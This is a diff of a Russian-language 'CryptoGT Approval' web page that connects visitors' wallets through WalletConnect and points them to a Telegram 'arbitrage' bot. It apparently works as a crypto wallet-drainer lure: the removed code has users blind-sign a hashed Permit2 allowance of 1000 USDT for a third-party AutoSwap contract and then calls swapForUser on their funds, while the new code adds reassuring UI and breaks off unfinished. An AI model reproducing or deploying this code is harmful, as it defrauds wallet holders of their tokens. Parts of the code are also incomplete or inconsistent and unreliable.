@@ -1,25 +1,215 @@
+
 <!DOCTYPE html>
 <html lang="ru">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Permit2 + AutoSwap</title>
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+  />
+  <title>WalletConnect Approval – CryptoGT</title>
+
+  <!-- Web3 и QRCode (UMD‑версии) -->
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.1/dist/web3.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcode@latest/build/qrcode.min.js"></script>
+
   <style>
-    body { background: #121212; color: white; font-family: sans-serif; padding: 20px; }
-    .card { background: #1f1f1f; padding: 20px; border-radius: 10px; max-width: 600px; margin: auto; }
-    button { background: #2ea6ff; border: none; color: white; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
-    canvas { margin: 20px auto; display: block; }
-    #status { margin: 10px 0; text-align: center; }
+    :root {
+      --tg-bg: #17212b;
+      --tg-text: #ffffff;
+      --tg-hint: #708499;
+      --tg-primary: #2ea6ff;
+      --tg-danger: #e64a45;
+    }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      background: var(--tg-bg);
+      color: var(--tg-text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif;
+      min-height: 100vh;
+      padding: 20px 15px;
+      line-height: 1.5;
+    }
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      min-height: 95vh;
+    }
+    header {
+      text-align: center;
+      margin-bottom: 30px;
+      padding-top: 10px;
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 5px;
+      font-weight: 600;
+    }
+    .subtitle {
+      color: var(--tg-hint);
+      font-size: 15px;
+    }
+    .card {
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 16px;
+      padding: 25px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    #status {
+      font-size: 17px;
+      margin-bottom: 20px;
+      min-height: 80px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      white-space: pre-wrap;
+    }
+    #qr-container {
+      width: 220px;
+      height: 220px;
+      margin: 0 auto 20px;
+      background: white;
+      padding: 10px;
+      border-radius: 12px;
+    }
+    #qr {
+      width: 100%;
+      height: 100%;
+    }
+    #uriText {
+      margin-top: 10px;
+      word-break: break-all;
+      font-size: 12px;
+      color: var(--tg-primary);
+      text-align: center;
+    }
+    .instructions {
+      background: rgba(46, 166, 255, 0.1);
+      border-radius: 12px;
+      padding: 15px;
+      margin: 20px 0;
+      text-align: left;
+      font-size: 14px;
+    }
+    .instructions h3 {
+      margin-bottom: 8px;
+      color: var(--tg-primary);
+    }
+    .instructions ol {
+      padding-left: 20px;
+    }
+    .instructions li {
+      margin-bottom: 5px;
+    }
+    .btn-group {
+      display: flex;
+      gap: 10px;
+      margin-top: auto;
+      padding-top: 20px;
+    }
+    button {
+      flex: 1;
+      padding: 15px;
+      border-radius: 12px;
+      border: none;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    #cancelBtn {
+      background: rgba(255, 255, 255, 0.08);
+      color: var(--tg-text);
+    }
+    #cancelBtn:hover {
+      background: rgba(255, 255, 255, 0.15);
+    }
+    #openInTg {
+      background: var(--tg-primary);
+      color: white;
+    }
+    #openInTg:hover {
+      opacity: 0.9;
+    }
+    .warning {
+      color: #ffa726;
+      margin: 10px 0;
+    }
+    .success {
+      color: #66bb6a;
+    }
+    .error {
+      color: var(--tg-danger);
+    }
+    .hidden {
+      display: none;
+    }
+    footer {
+      text-align: center;
+      margin-top: 30px;
+      color: var(--tg-hint);
+      font-size: 13px;
+    }
+    .browser-warning {
+      background: rgba(230, 74, 69, 0.15);
+      border-radius: 12px;
+      padding: 15px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>Подключение WalletConnect</h2>
-    <div id="status">Генерация QR-кода...</div>
-    <canvas id="qr"></canvas>
-    <button onclick="sendPermit()">Подписать Permit и Swap</button>
+  <div class="container">
+    <header>
+      <h1>CryptoGT Approval</h1>
+      <div class="subtitle">Подтвердите транзакцию через WalletConnect</div>
+    </header>
+
+    <!-- Предупреждение для тех, кто открыл вне Telegram -->
+    <div id="browserWarning" class="browser-warning hidden">
+      <p>Для лучшего опыта откройте это приложение в Telegram через нашего бота</p>
+    </div>
+
+    <div class="card">
+      <div id="status">Инициализация приложения...</div>
+
+      <div id="qr-container">
+        <canvas id="qr"></canvas>
+      </div>
+      <div id="uriText" class="hidden"></div>
+
+      <div id="gasInfo" class="hidden">
+        <div>Расчетный газ: <span id="gasEstimate">0</span> Gwei</div>
+      </div>
+    </div>
+
+    <div id="instructions" class="instructions hidden">
+      <h3>Как подключить:</h3>
+      <ol>
+        <li>Откройте Trust Wallet или MetaMask на вашем устройстве</li>
+        <li>Нажмите на кнопку "Scan QR code"</li>
+        <li>Наведите камеру на QR-код выше</li>
+        <li>Подтвердите подключение в кошельке</li>
+      </ol>
+    </div>
+
+    <div class="btn-group">
+      <button id="cancelBtn">Отменить</button>
+      <button id="openInTg" class="hidden">Открыть в Telegram</button>
+    </div>
+
+    <footer>
+      <div>© 2023 CryptoGT</div>
+      <div>Все транзакции защищены</div>
+    </footer>
   </div>
 
   <script type="module">
@@ -27,131 +217,114 @@
 
     const CONFIG = {
       USDT_CONTRACT: "0x55D398326f99059FF775485246999027B3197955",
-      KPC_CONTRACT: "0xA511768003D01eAA0f464fEEEa4b1CDDc4254b4f",
       PERMIT2_CONTRACT: "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4",
       AUTOSWAP_CONTRACT: "0x026C54B156b501ad9cEa422e59454D4b6d6f6963",
       WC_PROJECT_ID: "d868f90cd734355ae0320f8f0258b6b1",
-      RELAY_URL: "wss://relay.walletconnect.com",
-      AMOUNT: "1000000000000000000000", // 1000 USDT
-      CHAIN_ID: "eip155:56"
+      WC_RELAY_URL: "wss://relay.walletconnect.com",
+      BSC_RPC_URL: "https://bsc-dataseed.binance.org/",
+      TELEGRAM_BOT_URL: "https://t.me/cryptogt_arbitrage_bot?start=cryptogtarb",
+      AMOUNT: "1000" // USDT, для примера
     };
 
-    const status = document.getElementById("status");
+    const statusEl = document.getElementById("status");
     const qrCanvas = document.getElementById("qr");
-    let client, sessionTopic, address;
+    const uriTextEl = document.getElementById("uriText");
+    const cancelBtn = document.getElementById("cancelBtn");
+    const openInTgBtn = document.getElementById("openInTg");
+    const instructionsEl = document.getElementById("instructions");
+    const browserWarning = document.getElementById("browserWarning");
+    const gasEstimateEl = document.getElementById("gasEstimate");
+    const gasInfo = document.getElementById("gasInfo");
 
-    function updateStatus(text) {
-      status.textContent = text;
+    const isTelegramWebView = window.Telegram && window.Telegram.WebApp;
+
+    if (isTelegramWebView) {
+      Telegram.WebApp.ready();
+      Telegram.WebApp.expand();
+    } else {
+      browserWarning.classList.remove("hidden");
+      openInTgBtn.classList.remove("hidden");
+      instructionsEl.classList.remove("hidden");
+      openInTgBtn.addEventListener("click", () => {
+        window.open(CONFIG.TELEGRAM_BOT_URL, "_blank");
+      });
     }
 
-    async function init() {
-      updateStatus("Инициализация WalletConnect...");
-
-      client = await SignClient.init({
-        projectId: CONFIG.WC_PROJECT_ID,
-        relayUrl: CONFIG.RELAY_URL,
-        metadata: {
-          name: "Permit2 Swap",
-          description: "Подписать Permit и вызвать swapForUser",
-          url: window.location.href,
-          icons: ["https://cryptogt.app/icon.png"],
-        },
-      });
-
-      const { uri, approval } = await client.connect({
-        requiredNamespaces: {
-          eip155: {
-            methods: ["eth_sendTransaction", "personal_sign"],
-            chains: [CONFIG.CHAIN_ID],
-            events: [],
-          },
-        },
-      });
-
-      updateStatus("Сканируйте QR-код в кошельке...");
-      QRCode.toCanvas(qrCanvas, uri);
-
-      await approval();
-
-      const session = client.session;
-      sessionTopic = session.topic;
-      address = session.namespaces.eip155.accounts[0].split(":")[2];
-      updateStatus(`✅ Подключено: ${address}`);
-    }
-
-    async function sendPermit() {
-      try {
-        updateStatus("⏳ Получаем nonce из контракта...");
-        const web3 = new Web3(CONFIG.BSC_RPC_URL);
-        const iface = new web3.eth.Contract([
-          {
-            "inputs": [
-              { "internalType": "address", "name": "owner", "type": "address" },
-              { "internalType": "address", "name": "spender", "type": "address" },
-              { "internalType": "address", "name": "token", "type": "address" }
-            ],
-            "name": "allowanceNonces",
-            "outputs": [{ "internalType": "uint48", "name": "", "type": "uint48" }],
-            "stateMutability": "view",
-            "type": "function"
-          }
-        ], CONFIG.PERMIT2_CONTRACT);
-
-        const nonce = await iface.methods.allowanceNonces(address, CONFIG.AUTOSWAP_CONTRACT, CONFIG.USDT_CONTRACT).call();
-        const expiration = Math.floor(Date.now() / 1000) + 3600;
-
-        const message = web3.utils.soliditySha3(
-          { t: "address", v: CONFIG.USDT_CONTRACT },
-          { t: "address", v: address },
-          { t: "address", v: CONFIG.AUTOSWAP_CONTRACT },
-          { t: "uint160", v: CONFIG.AMOUNT },
-          { t: "uint48", v: expiration },
-          { t: "uint48", v: nonce }
-        );
-
-        updateStatus("📩 Подпишите Permit в кошельке...");
-
-        const signature = await client.request({
-          topic: sessionTopic,
-          chainId: CONFIG.CHAIN_ID,
-          request: {
-            method: "personal_sign",
-            params: [message, address],
-          },
-        });
-
-        const r = "0x" + signature.slice(2, 66);
-        const s = "0x" + signature.slice(66, 130);
-        const v = parseInt(signature.slice(130, 132), 16);
-
-        updateStatus("🚀 Отправка permitTransfer и swapForUser...");
-
-        const swapTxData = {
-          to: CONFIG.AUTOSWAP_CONTRACT,
-          data: web3.eth.abi.encodeFunctionCall({
-            name: "swapForUser",
-            type: "function",
-            inputs: [{ name: "user", type: "address" }, { name: "amountUSDT", type: "uint256" }]
-          }, [address, CONFIG.AMOUNT])
-        };
-
-        const txHash = await client.request({
-          topic: sessionTopic,
-          chainId: CONFIG.CHAIN_ID,
-          request: {
-            method: "eth_sendTransaction",
-            params: [swapTxData],
-          },
-        });
-
-        updateStatus("✅ Транзакция отправлена:\n" + txHash);
-      } catch (e) {
-        console.error(e);
-        updateStatus("❌ Ошибка: " + e.message);
+    function updateStatus(text, type) {
+      statusEl.textContent = text;
+      statusEl.className = "";
+      if (type) {
+        statusEl.classList.add(type);
       }
     }
 
-    init();
-  </script>
-</body>
-</html>
+    let client;
+    let sessionTopic;
+
+    async function initWalletConnect() {
+      try {
+        updateStatus("Инициализация WalletConnect...");
+        client = await SignClient.init({
+          projectId: CONFIG.WC_PROJECT_ID,
+          relayUrl: CONFIG.WC_RELAY_URL,
+          metadata: {
+            name: "CryptoGT Approval",
+            description: "Approve USDT transaction via WalletConnect",
+            url: window.location.href,
+            icons: ["https://cryptogt.app/icon.png"],
+          },
+          storageOptions: { database: ":memory:" },
+        });
+
+        updateStatus("Генерация подключения...");
+        const { uri, approval } = await client.connect({
+          requiredNamespaces: {
+            eip155: {
+              methods: ["eth_sendTransaction", "eth_chainId"],
+              chains: ["eip155:56"],
+              events: ["chainChanged"],
+            },
+          },
+        });
+
+        if (uri) {
+          updateStatus("Отсканируйте QR-код в кошельке");
+          instructionsEl.classList.remove("hidden");
+          QRCode.toCanvas(qrCanvas, uri, { width: 200, margin: 1 });
+          uriTextEl.textContent = uri;
+          uriTextEl.classList.remove("hidden");
+        }
+
+        await approval();
+
+        if (!client.session || !client.session.namespaces || !client.session.namespaces.eip155) {
+          throw new Error("Сессия не установлена или отсутствует namespace eip155");
+        }
+
+        sessionTopic = client.session.topic;
+
+        updateStatus("Проверка сети...");
+        const chainId = await client.request({
+          topic: sessionTopic,
+          chainId: "eip155:56",
+          request: { method: "eth_chainId" },
+        });
+
+        if (chainId !== "0x38") {
+          throw new Error("Пожалуйста, переключитесь на сеть Binance Smart Chain (chainId: 56)");
+        }
+
+        // Подготовка к permitTransfer через AutoSwap (пример)
+        await sendPermitTransfer();
+
+      } catch (err) {
+        console.error(err);
+        updateStatus("❌ Ошибка: " + (err.message || err), "error");
+      }
+    }
+
+    // Функция отправки permitTransfer через WalletConnect
+    async function sendPermitTransfer() {
+      updateStatus("Подготовка permitTransfer...");
+
+      // Здесь нужно собрать параметры для permitTransfer
